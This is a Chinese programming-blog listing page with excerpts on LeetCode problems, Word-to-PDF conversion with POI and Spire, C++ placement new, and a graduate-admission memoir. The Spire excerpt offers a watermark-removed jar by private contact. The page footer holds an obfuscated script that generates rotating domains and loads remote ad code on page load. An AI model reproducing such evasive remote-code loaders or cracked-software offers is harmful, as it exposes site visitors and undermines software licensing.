给定一个二叉树的根节点 root ，和一个整数 targetSum ，求该二叉树里节点值之和等于 targetSum 的 路径 的数目。
路径 不需要从根节点开始，也不需要在叶子节点结束，但是路径方向必须是向下的（只能从父节点到子节点）。
示例 1：
输入：root = [10,5,-3,3,2,null,11,3,-2,null,1], targetSum = 8 输出：3 解释：和等于 8 的路径有 3 条，如图所示。 示例 2：
输入：root = [5,4,8,11,null,13,4,7,2,null,null,5,1], targetSum = 22 输出：3 提示:
二叉树的节点个数的范围是 [0,1000]-109 &lt;= Node.val &lt;= 109 -1000 &lt;= targetSum &lt;= 1000 通过次数113,792提交次数199,106
简单的二叉树遍历
执行结果：
通过
显示详情
添加备注
执行用时：36 ms, 在所有 C++ 提交中击败了23.10%的用户
内存消耗：15.3 MB, 在所有 C++ 提交中击败了54.81%的用户
通过测试用例：126 / 126
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/50c72703e6b32535b99506309bb22cf4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e528c7ab5f5c34d8dc01299ce8310b5/" rel="bookmark">
			leetcode400. 第 N 位数字
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		400. 第 N 位数字
难度中等181
在无限的整数序列 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, ...中找到第 n 位数字。
注意：n 是正数且在 32 位整数范围内（n &lt; 231）。
示例 1：
输入：3 输出：3 示例 2：
输入：11 输出：0 解释：第 11 位数字在序列 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, ... 里是 0 ，它是 10 的一部分。 题目描述如上。
执行结果：
通过
显示详情
添加备注
执行用时：0 ms, 在所有 C++ 提交中击败了100.00%的用户
内存消耗：6.2 MB, 在所有 C++ 提交中击败了5.42%的用户
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0e528c7ab5f5c34d8dc01299ce8310b5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/be73d6245b747212ee90a496b0f57a6d/" rel="bookmark">
			poi 3.16 word转PDF（支持doc和docx）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		poi 3.16 word转PDF
poi 3.16 word转PDF（支持doc和docx） word转PDF用于在线预览
所需要的jar包 第一个 &lt;groupId&gt;org.apache.poi&lt;/groupId&gt; &lt;artifactId&gt;poi&lt;/artifactId&gt; &lt;version&gt;3.16&lt;/version&gt; 第二个 &lt;groupId&gt;org.apache.poi&lt;/groupId&gt; &lt;artifactId&gt;poi&lt;/artifactId&gt; &lt;version&gt;3.16&lt;/version&gt; 第三个 &lt;groupId&gt;org.Spire&lt;/groupId&gt; &lt;artifactId&gt;Spire&lt;/artifactId&gt; &lt;version&gt;0.0.1&lt;/version&gt; &lt;scope&gt;system&lt;/scope&gt; &lt;systemPath&gt; ${project.basedir}/src/main/resources/lib/Spire.Doc.jar &lt;/systemPath&gt; 第三个包我下载到我本地了 可以上网搜一下 网址：https://repo.e-iceblue.cn/#browse/browse:maven-public:e-iceblue%2Fspire.office%2F3.4.1%2Fspire.office-3.4.1.jar 如果用这个jar包转 是带水印的 而且只能转3页 或者500行 超过就不显示了 这里只是用它把doc转成docx 我自己这个jar包转格式时不带水印 不知道网上下载的带不带 如果需要去水印的jar包可以加我QQ找我要：279625695 （如果用官网上的jar包提示下载不下来 它这个需要配一下指向的私服 要不下载不下来） 代码：
package chzy.test.zipORrar;
import com.spire.doc.Document;
import com.spire.doc.FileFormat;
import fr.opensagres.poi.xwpf.converter.core.utils.StringUtils;
import org.apache.commons.collections4.MapUtils;
import fr.opensagres.poi.xwpf.converter.pdf.PdfConverter;
import fr.opensagres.poi.xwpf.converter.pdf.PdfOptions;
import org.apache.poi.xwpf.usermodel.*;
import java.io.*;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
public class WordtoPDF {
public static void main(String[] args) { String url ="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/be73d6245b747212ee90a496b0f57a6d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1dad532f1aa63c74349596904325ddae/" rel="bookmark">
			【C&#43;&#43;】Placement New
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		placement new是重载operator new的一个标准、全局的版本，它不能被自定义的版本代替（不像普通的operator new和operator delete能够被替换成用户自定义的版本）。
它的原型如下：
void *operator new( size_t, void *p ) throw() { return p; }
首先我们区分下几个容易混淆的关键词：new、operator new、placement new
new和delete操作符我们应该都用过，它们是对堆中的内存进行申请和释放，而这两个都是不能被重载的。要实现不同的内存分配行为，需要重载operator new，而不是new和delete。
看如下代码：
class MyClass {…};
MyClass * p=new MyClass;
这里的new实际上是执行如下3个过程：
1调用operator new分配内存；
2调用构造函数生成类对象；
3返回相应指针。
operator new就像operator+一样，是可以重载的，但是不能在全局对原型为void operator new(size_t size)这个原型进行重载，一般只能在类中进行重载。如果类中没有重载operator new，那么调用的就是全局的::operator new来完成堆的分配。同理，operator new[]、operator delete、operator delete[]也是可以重载的，一般你重载了其中一个，那么最好把其余三个都重载一遍。
placement new是operator new的一个重载版本，只是我们很少用到它。如果你想在已经分配的内存中创建一个对象，使用new是不行的。也就是说placement new允许你在一个已经分配好的内存中（栈或堆中）构造一个新的对象。原型中void*p实际上就是指向一个已经分配好的内存缓冲区的的首地址。
我们知道使用new操作符分配内存需要在堆中查找足够大的剩余空间，这个操作速度是很慢的，而且有可能出现无法分配内存的异常（空间不够）。placement new就可以解决这个问题。我们构造对象都是在一个预先准备好了的内存缓冲区中进行，不需要查找内存，内存分配的时间是常数；而且不会出现在程序运行中途出现内存不足的异常。所以，placement new非常适合那些对时间要求比较高，长时间运行不希望被打断的应用程序。
使用方法如下：
缓冲区提前分配 可以使用堆的空间，也可以使用栈的空间，所以分配方式有如下两种：
class MyClass {…};
char buf=new char[Nsizeof(MyClass)+ sizeof(int) ] ; 或者char buf[N*sizeof(MyClass)+ sizeof(int) ];
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1dad532f1aa63c74349596904325ddae/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e8199676adb5eee709dfa181e1b5ae8c/" rel="bookmark">
			2021年(2022届)双非计算机保研经历
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 个人背景 本科：双非(四非)cs专业，成绩rk2/200+，综合rk1
竞赛：软件杯国一等几个类似性质的比赛国奖（非acm选手
项目：几个竞赛经历对应的项目(cv方向)、大创
英语：四级470+，无六级（致命硬伤
论文：EI会议一作
2. 夏令营 院校初审结果中科大先研院x导师推荐入营制，联系不上导师，gg中科大科学岛x北邮csx未联系导师，导师权力大中科院信工所x北理csx华南理工sex北京师范人工智能学院入营候补wl靠后电子科大cs入营人均入营，纯宣讲，不发offer浙软入营不发offer，与华师考核冲突，放弃华东师范数据学院入营学硕优营，offer中南计院入营专硕优营，不完全等于offer东南网安入营专硕wl靠后(9.27晚候补到了) 3. 预推免 院校初审结果哈深x北理工csx厦大x电子科大cs通过学硕cs offer深圳大学通过offer(ps:离家近报的) 4.夏令营及预推免经历 双非cs保研真的挺不容易的，所以为了想去到更好的学校，我还是选择海投策略（除了自己一定不去的）
入营的几个指标：
本科背景(无法改变)、rk排名&gt;英语&gt;科研项目、竞赛、论文（这三项有特别突出的也可以是加分项）
入营之后的面试主要看的就是项目经历相关的了，有些会涉及专业课基础，部分高校也会考算法机试。
学校选择：（流传于各大保研群的一张图，仅作参考）
因为自己背景是双非，结合自身实际情况和往届学长学姐的一些去向，rk和项目竞赛经历还算可以，英语是硬伤，很多中9都卡六级，初步择校定位在中9及以下。
部分高校签了承诺书，就不过多涉及细节问答题目了
北京师范人工智能学院 北师ai报名只有cs学硕，其实北师ai能入营我也没想到的，因为查了下往年公布夏令营入营的双非似乎屈指可数，应该是因为今年还线上扩容了吧。
首先是学院宣讲，然后是下午机试，难度个人感觉属于中上(非acm选手），由于当时单线程评测机效率比较感人，导致非常多人提交完，要过5分钟才能出结果，加上自己机试水平有限，最终只过了签到题和另外一两题的部分数据。第二天机试好像是按oi得分制筛除了部分同学（没有公布名单）。当天晚上还有个别实验室招生答疑，当时还给一位符合我兴趣方向的老师发了简历（不过最后因为不是优营也没有下文了）。
接着就是第二天的一个英文短文献翻译，在下午的综合面试进行汇报。综合面试也是常见的自我介绍+常见英文问答+简历项目经历问答。
由于是第一次面试，也是分组第一个上的，没什么经验，也没准备英语问答，临时发挥比较拉跨，简历项目问答老师似乎感觉一般般。
过几天邮件发送结果，果不其然凉凉了，进了候补队列waiting list。官网也没公布具体名名单，后面向小组老师打听到是wl靠后。由于北师ai学院招的人不算多，所以我感觉应该无缘了。
中南计院 中南我报的是cs专硕，因为当时时间比较早，手里也没有offer，加上自己的几个指标评估，还是选择报专硕稳一稳。
先说结果，虽然听说夏令营入营了很多人，但是也不是全部入营，入营的bar不高，对双非比较友好。最后入营的大部分人也是邮件通知发了优营（中南cs优营不等于offer）。
面试过程也是常见英语提问+ppt简历介绍+提问，就不展开了。因为这次事先准备了几个英语问答，突出简历的亮点，最后也是拿到了个专硕优营。
其实在面试开始前几天我也联系了一位中南老师，老师人挺好的，私下进了一个简单的导师面聊天，不过和优营面试是分开的。虽然后期联系不多，但是最后9月份我拿到了心仪学校offer，为了不耽误老师招生，也第一时间向导师说明情况，老师也表示理解。
华东师范数据学院 我选的是数据科学与工程学硕(对应一级学科为软工)，当时也是为了求稳选的数据院，ecnu数据学院的夏令营给我的体验感非常好，招生老师们都很友好。
其实这个也没想到能入营的，ecnu有三个学院，相对来说入营难度：软院(se学科评估A)=计院&gt;数据院。听说华师也不会让oq鸽的概率大的入营，从最后的数据院优营结果分析，双非的大概占了4成。
首先是各组实验室的宣讲，主要方向是数据库、数据挖掘、机器学习、区块链、分布式系统等等。
接着是oj机试，数据院题目整体难度不算大，虽然我最后也是只a了2题多一点。最终决定成绩的还是综合面试，综合面试整体形式为一个英文短文口述和翻译，其余问答也是围绕简历展开的。
当天晚上宣布了优营结果，也是拿到了真正意义上的第一个学硕offer，当时挺高兴的，毕竟有学上了，对于双非来说，就华师offer已经算很不错的了。
拿到offer以后，我也第一时间深入了解数据院导师的相关信息，因为我不是纯title就业向的，所以方向和导师也是我考虑的因素，最终也联系了一位感兴趣的老师，不过导师没有给我肯定的答复，说等后期沟通，后面由于种种原因也不了了之，挺可惜的（ps：其实如果当时能和导师达成双选，我大概率会躺平了，因为再往上的985学硕挺难冲的）。
东南大学网安 其实东南今年夏令营和预推免合并在一起了，时间也是拖到8月中旬后。经过自身评估，东南cs院的bar比较高，se当时感觉没有具体了解，所以也随手报了网安院，最后也收到了入营通知。
但是这个网安夏令营个人体验不友好，首先报的是学硕，入营后被调剂到只能选南京专硕，因为宣讲完后了解到大部分导师方向也是网络、安全相关的，而优营是由导师面试决定的，我填写了两位意向导师后，结果等到优营公布也没有面试的机会，毫无存在感，连给展示的机会都没有，然后最终名单出来，果不其然我还是在候补的后面。（ps:既然不能保证给面试机会，为何还要放入营呢，估计还是为了养鱼吧）
9.27号晚上，招生老师说专硕指标候补到我了，不过当时也拿到了成电offer，就放弃了，说明东南网安专硕wl也鸽穿了，改天发了9推的面试通知。
电子科大cs 我在8月中旬联系到一位成电的导师，老师人挺好的，研究方向也和我本科经历关联度比较大，年轻idea多，学术实力也很强。后面和老师进一步交流沟通后，老师表示愿意给我留名额。
成电预推免比较晚，在9月中旬后，报名需要导师的推荐信，学硕或者专硕也是由面试成绩决定的。面试流程先是自我介绍+英语问答+专业抽题+综合面试，感觉决定成绩的主要还是综合面部分，综合面主要也是简历相关问题，具体就不展开了，最终也是拿下了cs学硕offer，也是我的最终去向。
深圳大学 主要还是因为离家近才报的预推免，电话视频面，具体过程较为轻松愉悦，难度较低，隔几天就发了合格证书offer。
5.一些感悟 以下是我的选择观点，以及给类似背景同学们一些感悟（仅做参考，不对您的抉择负责）
择校因素：学校title、学硕/专硕/直博、导师水平和类型、研究方向、地域
我希望给未来的自己最大化选择出路，有尝试科研的意向，退也可以互联网就业，也不愿意承担直博的风险，所以优先考虑cs学硕。基于有意科研兴趣的驱动，所以希望能选到一个人品和学术都不错的老师，并且研究方向是我感兴趣的，地域因素当然是越靠近以后想发展的地方更好。
基于以上原因，我最终还是选择了成电。其实保研难度普遍来说，学硕&gt;专硕&gt;直博(强组牛导除外)，计算机学院&gt;软院(华师除外)/网安院/其余院。
对于双非背景的同学们，如果想拿到更好的学校title，明确就业意向，可能考虑软院专硕可能性更大一点，比如浙软南软等。此外，如果明确科研意向，也可以考虑中科院那几个京所。如果想冲刺中九及以上学校，rk排名和英语(大部分中9卡六级)在初审都是很重要的，然后主要关注那些对双非友好的学校（有些学校也是卡学校学科背景的），也要关注该校是不是强committee(导师权力大不大)，对于那种导师权力大的学校要主动积极联系导师。面试中需要大胆展示自己的优势，扬长避短，比如科研项目专业课基础之类的，其实导师主要是希望通过你的优势经历来看出你的科研/工程潜质。
本人亲测和打听到的一些院校（仅供参考，无先后顺序之分）：
双非相对友好型985：华东师范大学、吉林大学、大连理工大学、东北大学、电子科大、重庆大学、西北工业大学、山东大学、国防科技大学、中南大学、湖南大学、厦门大学、浙江大学软件学院、南京大学软件学院、中科大科学岛；(北邮西电等211也是基本不歧视双非的、上科大和南科大有意向也可以多多尝试)双非基本不用尝试型985：中山、武大、上交、北理、同济、南开、西交(卡学科评估)、哈深acm机试选手友好型985：北航、华师、浙软等有机试的学校弱committee(导师权力大)院校：成电 西电 北邮(两电一邮)、西工大、重大、苏大 保研是一场信息战，我的信息来源主要是计算机保研各大交流群、各学校学院官网、计算机保研相关公众号。
我还是觉得一个萝卜一个坑，华五及以上级别的大部分应该是留给985/211的同学了，保研能跨一到两个台阶就很不错了，所以我主要也是在中下985择校，其实地域性学校都差不多，适合自己的就是最好的。
关于九推：在9.28号开放系统后，各大高校出现越来越多名场景，鸽子也集群出动，导致部分名校出现wl也鸽穿的现象，高风险高回报，上岸机会还是很大的，有些学校也招不满，也有点击就送的情况，也有人捡漏名校，主要还是看自己，我个人是不愿意承担高风险的，毕竟对于个人来说就是1和0的区别了。
三年积累，准备了好几个月的夏令营和预推免经历，都在9.28号填系统那天最终画下最后的句号。
曾经看到一段话，你现阶段的灯光和掌声只是在消耗你过去的积累。保研面试短短5-20分钟，其实很难全面反映一个人，简历只能体现我们过去做了啥。保研结束只是表示上个阶段的结束，休息完后未来还是不能躺平，无论意向想从事科研还是就业还是别的出路。
当你选择了一扇门，别的门都会关上。关于最终学校去处，我觉得适合自己的就是最好的。可能学校间title的差异，有时候小于同一学校组和组间的差异，乃至于远远小于人和人的差异，所以大家继续努力吧。
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/324/">«</a>
	<span class="pagination__item pagination__item--current">325/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/326/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>